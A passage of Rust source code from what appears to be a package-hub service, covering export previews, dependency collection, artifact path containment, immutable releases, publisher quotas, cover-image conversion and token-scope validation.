            HUB_ASSET_KIND_TEMPLATE_BUNDLE.to_string(),
            "template_with_dependencies".to_string(),
            selected.rel_path.clone(),
            selected.name,
            format!(
                "Template export with {} local dependencies",
                entries.len().saturating_sub(1)
            ),
            entries,
            warnings,
        ))
    }

    fn preview_folder(
        &self,
        layout: &ProjectFileLayout,
        source_ref: &str,
    ) -> Result<HubExportPreview, PlatformError> {
        let mut entries = collect_tree_entries(layout, source_ref)?;
        entries.sort_by(|a, b| a.rel_path.cmp(&b.rel_path));
        let name = Path::new(source_ref)
            .file_name()
            .and_then(|v| v.to_str())
            .unwrap_or(source_ref)
            .to_string();
        Ok(build_preview(
            HUB_ASSET_KIND_FOLDER_BUNDLE.to_string(),
            "folder_files".to_string(),
            source_ref.to_string(),
            name,
            "Recursive folder export".to_string(),
            entries,
            Vec::new(),
        ))
    }

    fn preview_project(
        &self,
        layout: &ProjectFileLayout,
    ) -> Result<HubExportPreview, PlatformError> {
        let mut entries = collect_tree_entries(layout, ".")?;
        entries.sort_by(|a, b| a.rel_path.cmp(&b.rel_path));
        Ok(build_preview(
            HUB_ASSET_KIND_PROJECT_BUNDLE.to_string(),
            "project_files".to_string(),
            ".".to_string(),
            "Project files".to_string(),
            "Full repo export".to_string(),
            entries,
            Vec::new(),
        ))
    }

    fn collect_template_dependency_entries(
        &self,
        layout: &ProjectFileLayout,
        rel_path: &str,
        reason: String,
        seen: &mut BTreeSet<String>,
        entries: &mut Vec<HubPackageFile>,
        warnings: &mut Vec<String>,
    ) -> Result<(), PlatformError> {
        let normalized = normalize_template_repo_rel(&layout.repo_layout, rel_path);
        if normalized.is_empty() || !seen.insert(normalized.clone()) {
            return Ok(());
        }
        let abs = layout.repo_dir.join(&normalized);
        if !abs.is_file() {
            warnings.push(format!("Skipped missing dependency '{}'", normalized));
            return Ok(());
        }
        let entry = read_repo_entry(layout, &normalized, reason)?;
        let source_text = if entry.encoding == "text" {
            entry.content.clone()
        } else {
            None
        };
        entries.push(entry);
        let Some(source_text) = source_text else {
            return Ok(());
        };
        let import_sources = extract_import_sources(&source_text);
        for src in import_sources {
            match resolve_local_import(layout, &normalized, &src) {
                Some(dep_rel) => self.collect_template_dependency_entries(
                    layout,
                    &dep_rel,
                    format!("imported from {}", normalized),
                    seen,
                    entries,
                    warnings,
                )?,
                None => {
                    if src.starts_with("@/") || src.starts_with('.') {
                        warnings.push(format!(
                            "Skipped unresolved local import '{}' from '{}'",
                            src, normalized
                        ));
                    }
                }
            }
        }
        Ok(())
    }
}

impl HubService {
    fn require_enabled(&self) -> Result<PlatformServiceInstance, PlatformError> {
        match self.get_default_service_instance()? {
            Some(service) if service.enabled => Ok(service),
            _ => Err(PlatformError::new(
                "HUB_SERVICE_DISABLED",
                "hub service is not enabled",
            )),
        }
    }

    fn ensure_service_authority(&self) -> Result<HubAuthority, PlatformError> {
        if let Some(authority) = self
            .hub_data
            .get_hub_authority(HUB_SERVICE_SCOPE_OWNER, HUB_SERVICE_SCOPE_PROJECT)?
        {
            return Ok(authority);
        }
        let service = self.require_enabled()?;
        let now = now_ts();
        let authority = HubAuthority {
            authority_id: DEFAULT_HUB_SERVICE_INSTANCE_ID.to_string(),
            host_project_id: service.host_office_id,
            owner: HUB_SERVICE_SCOPE_OWNER.to_string(),
            project: HUB_SERVICE_SCOPE_PROJECT.to_string(),
            enabled: true,
            public_base_url: service.public_base_url,
            created_at: now,
            updated_at: now,
        };
        self.hub_data.put_hub_authority(&authority)?;
        Ok(authority)
    }

    fn hub_artifact_path(&self, rel_path: &str) -> Result<PathBuf, PlatformError> {
        let rel_path = rel_path.trim().replace('\\', "/");
        if rel_path.is_empty() || rel_path.contains('\0') {
            return Err(PlatformError::new(
                "HUB_ARTIFACT_PATH_INVALID",
                "artifact path is invalid",
            ));
        }
        let rel = Path::new(&rel_path);
        if rel.is_absolute()
            || rel
                .components()
                .any(|component| !matches!(component, std::path::Component::Normal(_)))
        {
            return Err(PlatformError::new(
                "HUB_ARTIFACT_PATH_INVALID",
                "artifact path must be a contained relative path",
            ));
        }
        let service_rel_prefix = format!("services/{DEFAULT_HUB_SERVICE_INSTANCE_ID}/");
        if !rel_path.starts_with(&service_rel_prefix) {
            return Err(PlatformError::new(
                "HUB_ARTIFACT_PATH_INVALID",
                "artifact path must live under the hub service root",
            ));
        }
        let service_root = self
            .data_root
            .join("services")
            .join(DEFAULT_HUB_SERVICE_INSTANCE_ID);
        let abs = self.data_root.join(rel);
        let service_root = fs::canonicalize(&service_root)?;
        let abs = fs::canonicalize(&abs)?;
        if !abs.starts_with(&service_root) {
            return Err(PlatformError::new(
                "HUB_ARTIFACT_PATH_INVALID",
                "artifact path escapes hub service root",
            ));
        }
        Ok(abs)
    }

    fn hub_artifact_path_for_delete(&self, rel_path: &str) -> Result<PathBuf, PlatformError> {
        let rel_path = rel_path.trim().replace('\\', "/");
        if rel_path.is_empty() || rel_path.contains('\0') {
            return Err(PlatformError::new(
                "HUB_ARTIFACT_PATH_INVALID",
                "artifact path is invalid",
            ));
        }
        let rel = Path::new(&rel_path);
        if rel.is_absolute()
            || rel
                .components()
                .any(|component| !matches!(component, std::path::Component::Normal(_)))
        {
            return Err(PlatformError::new(
                "HUB_ARTIFACT_PATH_INVALID",
                "artifact path must be a contained relative path",
            ));
        }
        let service_rel_prefix = format!("services/{DEFAULT_HUB_SERVICE_INSTANCE_ID}/");
        if !rel_path.starts_with(&service_rel_prefix) {
            return Err(PlatformError::new(
                "HUB_ARTIFACT_PATH_INVALID",
                "artifact path must live under the hub service root",
            ));
        }
        Ok(self.data_root.join(rel))
    }

    /// Refuse a publish that would overwrite an existing `package@version`.
    ///
    /// Releases are immutable: see the decision recorded in
    /// `docs/contracts/kinds/hub-package/README.md`. `zeb.lock` pins a version
    /// to a digest, and a digest only means something when the bytes it names
    /// cannot change underneath it — an overwritten release turns a republish
    /// into a tampered-dependency report in every project that pinned it.
    ///
    /// Every publish path calls this before it writes anything durable, so a
    /// refusal leaves the stored artifact, the version row, and its digest
    /// exactly as the first publish left them.
    fn enforce_release_immutability(
        &self,
        package_id: &str,
        version: &str,
    ) -> Result<(), PlatformError> {
        let Some(existing) = self.hub_data.get_hub_asset_version(package_id, version)? else {
            return Ok(());
        };
        // A retracted release keeps its row precisely so this branch is
        // reachable: the bytes are gone and the coordinate is still taken.
        if existing.retracted_at.is_some() {
            return Err(PlatformError::new(
                "HUB_VERSION_RETRACTED",
                format!(
                    "{package_id}@{version} was retracted and its coordinates can never be reused; publish a new version"
                ),
            ));
        }
        Err(PlatformError::new(
            "HUB_VERSION_EXISTS",
            format!(
                "{package_id}@{version} is already published and releases are immutable; bump the version and publish again"
            ),
        ))
    }

    fn enforce_publisher_package_quota(
        &self,
        publisher: &HubPublisher,
        package_id: &str,
        existing_package: Option<&HubAssetPackage>,
        artifact_bytes: usize,
    ) -> Result<(), PlatformError> {
        let max_package_bytes = normalize_limit(
            publisher.max_package_bytes,
            DEFAULT_PUBLISHER_MAX_PACKAGE_BYTES,
        );
        let max_packages = normalize_limit(publisher.max_packages, DEFAULT_PUBLISHER_MAX_PACKAGES);
        if artifact_bytes as i64 > max_package_bytes {
            return Err(PlatformError::new(
                "HUB_PUBLISHER_QUOTA_EXCEEDED",
                "publisher artifact byte limit exceeded",
            ));
        }
        if let Some(existing) = existing_package {
            if existing.publisher_id != publisher.publisher_id
                || existing.publisher_pk != publisher.publisher_pk
            {
                return Err(PlatformError::new(
                    "HUB_PACKAGE_FORBIDDEN",
                    "package id already belongs to another publisher",
                ));
            }
            return Ok(());
        }
        let package_count = self
            .hub_data
            .list_hub_asset_packages()?
            .into_iter()
            .filter(|item| {
                item.publisher_id == publisher.publisher_id
                    && item.publisher_pk == publisher.publisher_pk
            })
            .count() as i64;
        if package_count >= max_packages {
            return Err(PlatformError::new(
                "HUB_PUBLISHER_QUOTA_EXCEEDED",
                "publisher package count limit exceeded",
            ));
        }
        if package_id.is_empty() {
            return Err(PlatformError::new(
                "HUB_PUBLISH_INVALID",
                "package id must not be empty",
            ));
        }
        Ok(())
    }
}

fn remote_hub_api_base(base_url: &str) -> String {
    base_url.trim().trim_end_matches('/').to_string()
}

fn is_direct_hub_base(base_url: &str) -> bool {
    let base = remote_hub_api_base(base_url).to_lowercase();
    is_legacy_project_hub_base(&base) || is_ownerless_hub_base(&base)
}

fn is_legacy_project_hub_base(base_url: &str) -> bool {
    let base = remote_hub_api_base(base_url).to_lowercase();
    base.contains("/api/projects/") && base.ends_with("/hub")
}

fn is_ownerless_hub_base(base_url: &str) -> bool {
    let base = remote_hub_api_base(base_url).to_lowercase();
    base.ends_with("/api") || base.ends_with("/api/hub")
}

fn ownerless_hub_url(api_base: &str, suffix: &str) -> String {
    if api_base.to_lowercase().ends_with("/api/hub") {
        format!("{}/{}", api_base, suffix)
    } else {
        format!("{}/hub/{}", api_base, suffix)
    }
}

/// The hub path one referenced artifact is served at.
///
/// It is namespaced by the release that names it rather than being a bare
/// content address, so the hub applies that release's own visibility and
/// retraction rules to the bytes it hands over, and so a digest alone is not a
/// key to the whole store.
fn remote_artifact_suffix(package_id: &str, version: &str, sha256: &str) -> String {
    format!("remote/assets/{package_id}/{version}/artifacts/{sha256}")
}

fn remote_hub_url(repo: &ProjectHubRepository, suffix: &str) -> String {
    let api_base = remote_hub_api_base(&repo.base_url);
    let suffix = suffix.trim_start_matches('/');
    if is_legacy_project_hub_base(&api_base) {
        format!("{}/{}", api_base, suffix)
    } else if is_ownerless_hub_base(&api_base) {
        ownerless_hub_url(&api_base, suffix)
    } else {
        format!(
            "{}/projects/{}/{}/hub/{}",
            api_base, repo.remote_owner, repo.remote_project, suffix
        )
    }
}

fn remote_hub_url_for_platform(repo: &PlatformHubRepository, suffix: &str) -> String {
    let api_base = remote_hub_api_base(&repo.base_url);
    let suffix = suffix.trim_start_matches('/');
    if is_legacy_project_hub_base(&api_base) {
        format!("{}/{}", api_base, suffix)
    } else if is_ownerless_hub_base(&api_base) {
        ownerless_hub_url(&api_base, suffix)
    } else {
        format!(
            "{}/projects/{}/{}/hub/{}",
            api_base, repo.remote_owner, repo.remote_project, suffix
        )
    }
}

fn validate_remote_hub_url(url: &str) -> Result<(), PlatformError> {
    if hub_localhost_remote_allowed(url) {
        return Ok(());
    }
    crate::pipeline::security::validate_outbound_http_url(url, "hub.remote")
        .map_err(|err| PlatformError::new(err.code, err.message))
}

fn hub_localhost_remote_allowed(url: &str) -> bool {
    // Test/dev escape hatch for two local Zebflow instances. Production must
    // leave this unset so hub remotes follow the normal egress policy.
    if std::env::var("ZEBFLOW_HUB_ALLOW_LOCALHOST_REMOTE")
        .ok()
        .as_deref()
        != Some("1")
    {
        return false;
    }
    let Ok(parsed) = reqwest::Url::parse(url) else {
        return false;
    };
    matches!(
        parsed.host_str().unwrap_or(""),
        "localhost" | "127.0.0.1" | "::1"
    )
}

fn clear_repo_worktree_preserving_git(repo_dir: &Path) -> Result<(), PlatformError> {
    let entries =
        fs::read_dir(repo_dir).map_err(|err| PlatformError::new("HUB_INSTALL", err.to_string()))?;
    for entry in entries.flatten() {
        let path = entry.path();
        let keep = path
            .file_name()
            .and_then(|value| value.to_str())
            .map(|name| name == ".git")
            .unwrap_or(false);
        if keep {
            continue;
        }
        if path.is_dir() {
            fs::remove_dir_all(&path)
                .map_err(|err| PlatformError::new("HUB_INSTALL", err.to_string()))?;
        } else {
            fs::remove_file(&path)
                .map_err(|err| PlatformError::new("HUB_INSTALL", err.to_string()))?;
        }
    }
    Ok(())
}

fn sanitize_install_repo_path(
    layout: &ProjectFileLayout,
    rel_path: &str,
) -> Result<PathBuf, PlatformError> {
    let cleaned = rel_path.trim_start_matches("./").trim_start_matches('/');
    let abs = layout.repo_dir.join(cleaned);
    if !abs.starts_with(&layout.repo_dir) {
        return Err(PlatformError::new(
            "HUB_INSTALL",
            "artifact path escaped repo root",
        ));
    }
    Ok(abs)
}

fn build_preview(
    asset_kind: String,
    source_type: String,
    source_ref: String,
    name: String,
    description: String,
    entries: Vec<HubPackageFile>,
    warnings: Vec<String>,
) -> HubExportPreview {
    let total_bytes = entries.iter().map(|item| item.size_bytes).sum();
    let total_files = entries.len();
    HubExportPreview {
        asset_kind,
        source_type,
        source_ref,
        name,
        description,
        entries,
        warnings,
        total_files,
        total_bytes,
    }
}

fn text_export_entry(rel_path: &str, kind: &str, reason: &str, content: String) -> HubPackageFile {
    HubPackageFile {
        rel_path: rel_path.to_string(),
        kind: kind.to_string(),
        size_bytes: content.len(),
        reason: reason.to_string(),
        encoding: "text".to_string(),
        content: Some(content),
        artifact: None,
    }
}

fn rewrite_project_libraries(
    preview: &mut HubExportPreview,
    selected_libraries: &[String],
) -> Result<(), PlatformError> {
    let Some(entry) = preview.entries.iter_mut().find(|entry| {
        normalize_repo_rel(&entry.rel_path) == crate::contracts::kinds::PROJECT_CONFIGURATION_FILE
    }) else {
        return Ok(());
    };
    let Some(raw) = entry_text(entry) else {
        return Err(PlatformError::new(
            "HUB_PUBLISH",
            "zebflow.yaml must be a text entry",
        ));
    };
    let mut document =
        crate::contracts::decode_contract_yaml::<ProjectConfigurationContract>(raw.as_bytes())
            .map_err(|err| {
                PlatformError::new("HUB_PUBLISH", format!("invalid zebflow.yaml: {err}"))
            })?;
    let cfg = &mut document.spec;
    let selected = selected_libraries.iter().cloned().collect::<BTreeSet<_>>();
    cfg.rwe.libraries.retain(|name, _| selected.contains(name));
    let content = String::from_utf8(
        crate::contracts::encode_contract_yaml::<ProjectConfigurationContract>(
            document.metadata,
            document.spec,
        )
        .map_err(|err| PlatformError::new("HUB_PUBLISH", err.to_string()))?,
    )
    .map_err(|err| PlatformError::new("HUB_PUBLISH", err.to_string()))?;
    entry.size_bytes = content.len();
    entry.encoding = "text".to_string();
    entry.content = Some(content);
    Ok(())
}

/// Reads the publisher's chosen image and normalises it to a WebP cover.
///
/// Nothing is stored: this is the half both the publish path and its dry-run
/// review share, so a review costs the same conversion and the same quota check
/// without writing anything.
fn hub_cover_webp_from_path(
    layout: &ProjectFileLayout,
    image_file_path: &str,
    publisher: &HubPublisher,
) -> Result<Option<(String, Vec<u8>)>, PlatformError> {
    let image_file_path = image_file_path.trim();
    if image_file_path.is_empty() {
        return Ok(None);
    }
    let rel = normalize_object_path(image_file_path)
        .map_err(|err| PlatformError::new("HUB_MEDIA_INVALID", err.to_string()))?;
    let zebfs = LocalZebFs::new(layout.files_dir.clone());
    let object = zebfs
        .get(&rel)
        .map_err(|err| PlatformError::new("HUB_MEDIA_MISSING", err.to_string()))?;
    image_content_type_from_path(&rel)?;
    let max_image_bytes =
        normalize_limit(publisher.max_image_bytes, DEFAULT_PUBLISHER_MAX_IMAGE_BYTES) as usize;
    let webp_bytes = normalize_hub_cover_to_webp(&object.bytes)?;
    if webp_bytes.len() > max_image_bytes {
        return Err(PlatformError::new(
            "HUB_PUBLISHER_QUOTA_EXCEEDED",
            "webp cover image exceeds publisher max image bytes",
        ));
    }
    Ok(Some((HUB_COVER_MEDIA_NAME.to_string(), webp_bytes)))
}

/// A review of what the cover would be, without storing it.
fn hub_cover_media_review(
    layout: &ProjectFileLayout,
    image_file_path: &str,
    publisher: &HubPublisher,
) -> Result<Vec<HubPublishMediaReview>, PlatformError> {
    let Some((name, bytes)) = hub_cover_webp_from_path(layout, image_file_path, publisher)? else {
        return Ok(Vec::new());
    };
    Ok(vec![HubPublishMediaReview {
        name,
        role: "cover".to_string(),
        content_type: HUB_COVER_MEDIA_TYPE.to_string(),
        size_bytes: bytes.len(),
    }])
}

/// Validates inbound presentation images and decodes them for storing.
///
/// The bytes are returned rather than kept: the caller puts them in the
/// content-addressed artifact store and records only the digest.
fn decode_remote_hub_media(
    media: &[RemoteHubPublishMedia],
    publisher: &HubPublisher,
) -> Result<Vec<(HubAssetMedia, Vec<u8>)>, PlatformError> {
    let max_media_files =
        normalize_limit(publisher.max_media_files, DEFAULT_PUBLISHER_MAX_MEDIA_FILES) as usize;
    if media.len() > max_media_files {
        return Err(PlatformError::new(
            "HUB_PUBLISHER_QUOTA_EXCEEDED",
            "media file count exceeds publisher limit",
        ));
    }
    let max_image_bytes =
        normalize_limit(publisher.max_image_bytes, DEFAULT_PUBLISHER_MAX_IMAGE_BYTES) as usize;
    let mut out = Vec::with_capacity(media.len());
    for item in media {
        let normalized_name = normalize_media_name(&item.name)?;
        if normalized_name != item.name {
            return Err(PlatformError::new(
                "HUB_MEDIA_INVALID",
                "media name is not normalized",
            ));
        }
        if item.encoding != "base64" {
            return Err(PlatformError::new(
                "HUB_MEDIA_INVALID",
                "media encoding must be base64",
            ));
        }
        validate_image_content_type(&item.content_type)?;
        if item.size_bytes > max_image_bytes {
            return Err(PlatformError::new(
                "HUB_PUBLISHER_QUOTA_EXCEEDED",
                "image exceeds publisher max image bytes",
            ));
        }
        let bytes = base64::engine::general_purpose::STANDARD
            .decode(&item.content)
            .map_err(|err| PlatformError::new("HUB_MEDIA_INVALID", err.to_string()))?;
        if bytes.len() != item.size_bytes || sha256_hex(&bytes) != item.sha256 {
            return Err(PlatformError::new(
                "HUB_MEDIA_INVALID",
                "media size or hash does not match content",
            ));
        }
        if bytes.len() > max_image_bytes {
            return Err(PlatformError::new(
                "HUB_PUBLISHER_QUOTA_EXCEEDED",
                "image exceeds publisher max image bytes",
            ));
        }
        out.push((
            HubAssetMedia {
                name: item.name.clone(),
                role: item.role.clone(),
                content_type: item.content_type.clone(),
                size_bytes: bytes.len(),
                artifact_sha256: sha256_hex(&bytes),
            },
            bytes,
        ));
    }
    Ok(out)
}

fn validate_hub_gallery(
    gallery: &HubAssetGallery,
    media: &[HubAssetMedia],
) -> Result<(), PlatformError> {
    let media_names = media
        .iter()
        .map(|item| item.name.as_str())
        .collect::<BTreeSet<_>>();
    if let Some(cover) = &gallery.cover {
        if cover.kind.trim() != "image" {
            return Err(PlatformError::new(
                "HUB_GALLERY_INVALID",
                "gallery cover kind must be image",
            ));
        }
        validate_gallery_media_ref(&cover.media_name, &media_names)?;
    }
    for item in &gallery.items {
        match item.kind.trim() {
            "image" => validate_gallery_media_ref(&item.media_name, &media_names)?,
            "youtube" => validate_youtube_url(&item.url)?,
            _ => {
                return Err(PlatformError::new(
                    "HUB_GALLERY_INVALID",
                    "gallery item kind must be image or youtube",
                ));
            }
        }
    }
    Ok(())
}

#[allow(clippy::too_many_arguments)]
/// The safety review of the entries a publish would store.
///
/// The publish preview and the publish itself both read the package through
/// this, so the verdict a publisher is shown is the verdict that refuses them.
/// Two readings of one package could disagree, and the one that refuses is not
/// overridable by anyone.
fn review_publish_entries(
    layout: &ResolvedProjectLayout,
    asset_kind: &str,
    entries: &[HubPackageFile],
    warnings: Vec<String>,
    title: &str,
    description: &str,
    has_cover_image: bool,
    artifacts: &HubArtifactChannel,
) -> PackageSafetyReview {
    let policy_entries = entries
        .iter()
        .map(|entry| package_policy_entry(&entry.rel_path, entry, artifacts))
        .collect::<Vec<_>>();
    review_package_entries(
        layout,
        &policy_entries,
        warnings,
        PackageReviewOptions {
            publish_mode: true,
            require_title: true,
            require_description: true,
            require_cover_image: true,
            title: title.to_string(),
            description: description.to_string(),
            has_cover_image,
            bundle_internal_paths: asset_kind == HUB_ASSET_KIND_NODE_BUNDLE,
        },
    )
}

/// The layout a publish reviews against: the publisher's own directories, with
/// the extension set left at the platform floor.
///
/// The directories have to be the publisher's, because they are what decides
/// which of its entries are pipelines. The extension set must not be: it says
/// what a *receiver* accepts, which is why `recorded_publisher_layout` never
/// writes it into a release and `publisher_layout` never reads one back. A
/// project may narrow its own set, and reviewing a publish against a narrowed
/// one would refuse a release every receiver would have installed -- with no
/// override anywhere to undo it.
fn publish_review_layout(source: &ResolvedProjectLayout) -> ResolvedProjectLayout {
    ResolvedProjectLayout {
        allowed_extensions: ResolvedProjectLayout::platform_default().allowed_extensions,
        ..source.clone()
    }
}

/// Refuses a publish whose release no install would accept.
///
/// A violation is not overridable, so a release carrying one is refused by
/// every install gate on every channel -- including this hub's own. Storing it
/// would spend a version number on bytes nobody can use, and that spend is
/// permanent: `enforce_release_immutability` refuses the coordinate a second
/// time and retraction keeps it reserved. Refusing here costs the publisher a
/// retry; accepting costs them the version.
fn refuse_publish_violations(
    code: &'static str,
    review: &PackageSafetyReview,
) -> Result<(), PlatformError> {
    if review.is_installable() {
        return Ok(());
    }
    Err(PlatformError::new(
        code,
        format!(
            "package cannot be published: {}",
            review.violations.join("; ")
        ),
    ))
}

fn review_publish_artifact(
    layout: &ResolvedProjectLayout,
    package_id: String,
    version: String,
    preview: HubExportPreview,
    title: String,
    description: String,
    visibility: String,
    tags: Vec<String>,
    media: Vec<HubPublishMediaReview>,
    project_initialization: HubPackageInitialization,
    artifacts: &HubArtifactChannel,
) -> Result<HubPublishReview, PlatformError> {
    let policy = review_publish_entries(
        layout,
        &preview.asset_kind,
        &preview.entries,
        preview.warnings.clone(),
        &title,
        &description,
        !media.is_empty(),
        artifacts,
    );

    Ok(HubPublishReview {
        package_id,
        version,
        asset_kind: preview.asset_kind.clone(),
        source_type: preview.source_type.clone(),
        source_ref: preview.source_ref.clone(),
        title,
        description,
        visibility,
        tags,
        total_files: preview.total_files,
        total_bytes: preview.total_bytes,
        files: preview.entries.clone(),
        media,
        nodes_used: policy.nodes_used,
        credentials_required: policy.credentials_required,
        external_urls: policy.external_urls,
        database_effects: policy.database_effects,
        filesystem_effects: policy.filesystem_effects,
        network_effects: policy.network_effects,
        code_execution: policy.code_execution,
        public_endpoints: policy.public_endpoints,
        schedules: policy.schedules,
        large_files: policy.large_files,
        seed_data: policy.seed_data,
        database_initialization: policy.database_initialization,
        project_initialization: serde_json::to_value(project_initialization)
            .map_err(|err| PlatformError::new("HUB_PUBLISH_REVIEW", err.to_string()))?,
        warnings: policy.warnings,
        violations: policy.violations,
        risk_level: policy.risk_level,
    })
}

fn normalize_hub_cover_to_webp(bytes: &[u8]) -> Result<Vec<u8>, PlatformError> {
    const MAX_DIM: u32 = 8000;
    const MAX_DECODED_BYTES: u64 = 128 * 1024 * 1024;
    let (w, h) = image::ImageReader::new(Cursor::new(bytes))
        .with_guessed_format()
        .map_err(|err| PlatformError::new("HUB_MEDIA_INVALID", err.to_string()))?
        .into_dimensions()
        .map_err(|err| PlatformError::new("HUB_MEDIA_INVALID", err.to_string()))?;
    if w == 0 || h == 0 || w > MAX_DIM || h > MAX_DIM {
        return Err(PlatformError::new(
            "HUB_MEDIA_INVALID",
            "cover image dimensions are invalid or too large",
        ));
    }
    if (w as u64) * (h as u64) * 4 > MAX_DECODED_BYTES {
        return Err(PlatformError::new(
            "HUB_MEDIA_INVALID",
            "cover image decoded size is too large",
        ));
    }
    let image = image::ImageReader::new(Cursor::new(bytes))
        .with_guessed_format()
        .map_err(|err| PlatformError::new("HUB_MEDIA_INVALID", err.to_string()))?
        .decode()
        .map_err(|err| PlatformError::new("HUB_MEDIA_INVALID", err.to_string()))?;
    let image = fit_hub_cover(image, 1200, 675);
    let mut out = Vec::new();
    image
        .write_to(&mut Cursor::new(&mut out), ImageFormat::WebP)
        .map_err(|err| PlatformError::new("HUB_MEDIA_INVALID", err.to_string()))?;
    Ok(out)
}

fn fit_hub_cover(img: DynamicImage, max_w: u32, max_h: u32) -> DynamicImage {
    let (w, h) = img.dimensions();
    if w <= max_w && h <= max_h {
        return img;
    }
    img.resize(max_w, max_h, FilterType::Lanczos3)
}

fn validate_gallery_media_ref(
    media_name: &str,
    media_names: &BTreeSet<&str>,
) -> Result<(), PlatformError> {
    let normalized = normalize_media_name(media_name)?;
    if normalized != media_name {
        return Err(PlatformError::new(
            "HUB_GALLERY_INVALID",
            "gallery media name is not normalized",
        ));
    }
    if !media_names.contains(media_name) {
        return Err(PlatformError::new(
            "HUB_GALLERY_INVALID",
            "gallery image must reference an existing media item",
        ));
    }
    Ok(())
}

fn validate_youtube_url(input: &str) -> Result<(), PlatformError> {
    let url = reqwest::Url::parse(input.trim()).map_err(|_| {
        PlatformError::new("HUB_GALLERY_INVALID", "youtube URL must be a valid URL")
    })?;
    if url.scheme() != "https" {
        return Err(PlatformError::new(
            "HUB_GALLERY_INVALID",
            "youtube URL must use https",
        ));
    }
    let host = url.host_str().unwrap_or_default().to_ascii_lowercase();
    let ok_host = matches!(
        host.as_str(),
        "youtube.com" | "www.youtube.com" | "youtu.be" | "m.youtube.com"
    );
    if !ok_host {
        return Err(PlatformError::new(
            "HUB_GALLERY_INVALID",
            "gallery video URL must be a YouTube URL",
        ));
    }
    Ok(())
}

fn normalize_media_name(input: &str) -> Result<String, PlatformError> {
    let value = input.trim();
    if value.is_empty()
        || value.contains('/')
        || value.contains('\\')
        || value.contains('\0')
        || value == "."
        || value == ".."
    {
        return Err(PlatformError::new(
            "HUB_MEDIA_INVALID",
            "media name must be a plain file name",
        ));
    }
    Ok(value.to_string())
}

fn image_content_type_from_path(path: &str) -> Result<String, PlatformError> {
    let ext = Path::new(path)
        .extension()
        .and_then(|value| value.to_str())
        .unwrap_or_default()
        .to_ascii_lowercase();
    let content_type = match ext.as_str() {
        "png" => "image/png",
        "jpg" | "jpeg" => "image/jpeg",
        "webp" => "image/webp",
        "gif" => "image/gif",
        _ => {
            return Err(PlatformError::new(
                "HUB_MEDIA_INVALID",
                "package image must be png, jpg, webp, or gif",
            ));
        }
    };
    Ok(content_type.to_string())
}

fn normalize_hub_id_segment(raw: &str, label: &str) -> Result<String, PlatformError> {
    let mut out = String::new();
    let mut last_dash = false;
    for c in raw.trim().to_ascii_lowercase().chars() {
        if c.is_ascii_alphanumeric() {
            out.push(c);
            last_dash = false;
        } else if c == '-' || c == '_' || c.is_ascii_whitespace() {
            if !last_dash && !out.is_empty() {
                out.push('-');
                last_dash = true;
            }
        } else if !last_dash && !out.is_empty() {
            out.push('-');
            last_dash = true;
        }
    }
    let value = out.trim_matches('-').to_string();
    if value.is_empty() {
        return Err(PlatformError::new(
            "HUB_ID_INVALID",
            format!("{label} must contain at least one alphanumeric character"),
        ));
    }
    Ok(value)
}

fn canonical_hub_package_id(
    publisher_id: &str,
    raw_package_id: &str,
) -> Result<String, PlatformError> {
    let publisher = normalize_hub_id_segment(publisher_id, "publisher id")?;
    let trimmed = raw_package_id.trim();
    let asset_raw = if let Some((prefix, rest)) = trimmed.split_once('.') {
        let normalized_prefix = normalize_hub_id_segment(prefix, "package publisher prefix")?;
        if normalized_prefix != publisher {
            return Err(PlatformError::new(
                "HUB_PACKAGE_ID_INVALID",
                "package id must use the selected publisher prefix",
            ));
        }
        rest
    } else {
        trimmed
    };
    let asset = normalize_hub_id_segment(asset_raw, "asset slug")?;
    Ok(format!("{publisher}.{asset}"))
}

fn validate_image_content_type(content_type: &str) -> Result<(), PlatformError> {
    match content_type.trim().to_ascii_lowercase().as_str() {
        "image/png" | "image/jpeg" | "image/webp" | "image/gif" => Ok(()),
        _ => Err(PlatformError::new(
            "HUB_MEDIA_INVALID",
            "media content type is not an allowed image type",
        )),
    }
}

fn normalize_visibility(input: &str) -> String {
    match input.trim().to_ascii_lowercase().as_str() {
        "public" => "public".to_string(),
        "unlisted" => "unlisted".to_string(),
        _ => "private".to_string(),
    }
}

/// The scopes a hub token may hold, in the form a refusal quotes them.
const HUB_TOKEN_SCOPES: &str = "hub:read, hub:publish, hub:manage";

/// Normalise requested token scopes, refusing anything unusable.
///
/// An unrecognised scope used to be dropped here, so a token asked for
/// `["read","publish"]` was created holding nothing and only failed much later,
/// at a different endpoint, as `HUB_TOKEN_FORBIDDEN / scope missing`. An input
/// the system cannot use is refused where it is given, naming the value.
fn normalize_scopes(input: &[String]) -> Result<Vec<String>, PlatformError> {
    let mut out = Vec::with_capacity(input.len());
    for raw in input {
        let scope = raw.trim().to_ascii_lowercase();
        match scope.as_str() {
            "hub:read" | "hub:publish" | "hub:manage" => out.push(scope),
            _ => {
                return Err(PlatformError::new(
                    "HUB_TOKEN_SCOPE_INVALID",
                    format!(
                        "'{}' is not a hub token scope; accepted scopes are {HUB_TOKEN_SCOPES}",
                        raw.trim()
                    ),
                ));
            }
        }
    }
    out.sort();
    out.dedup();
    if out.is_empty() {
        return Err(PlatformError::new(
            "HUB_TOKEN_SCOPE_INVALID",
            format!("a token needs at least one scope; accepted scopes are {HUB_TOKEN_SCOPES}"),
        ));
    }
    Ok(out)
}

fn validate_publisher_scopes(
    publisher: &HubPublisher,
    scopes: &[String],
) -> Result<(), PlatformError> {
    for scope in scopes {
        let allowed = match scope.as_str() {
            "hub:read" => publisher.can_read,
            "hub:publish" => publisher.can_publish,
            "hub:manage" => publisher.can_manage,
            _ => false,
        };
        if !allowed {
            return Err(PlatformError::new(
                "HUB_PUBLISHER_SCOPE_DENIED",
                "publisher is not allowed to create a token with the requested scope",
            ));
        }
    }
    Ok(())
}

fn apply_scope_flags(mut token: HubToken) -> HubToken {
    token.scope_read = token.scopes.iter().any(|scope| scope == "hub:read");
    token.scope_publish = token.scopes.iter().any(|scope| scope == "hub:publish");
    token.scope_manage = token.scopes.iter().any(|scope| scope == "hub:manage");
    token
}

fn normalize_publisher_url(publisher_id: &str, explicit: &str) -> String {
    let trimmed = explicit.trim();
    if !trimmed.is_empty() {
        trimmed.to_string()
    } else if publisher_id.is_empty() {
        String::new()
    } else {
        format!("/publishers/{publisher_id}")
    }
}

fn normalize_source_type(input: &str) -> String {
    match input.trim() {
        "template_with_dependencies" => "template_with_dependencies".to_string(),
        "folder_files" => "folder_files".to_string(),
        "project_files" => "project_files".to_string(),
        _ => "pipeline_with_dependencies".to_string(),
    }
}

fn validate_hub_asset_kind(input: &str) -> Result<String, PlatformError> {
    let value = input.trim();
    if HUB_ASSET_KINDS.contains(&value) {
        Ok(value.to_string())
    } else {
        Err(PlatformError::new(
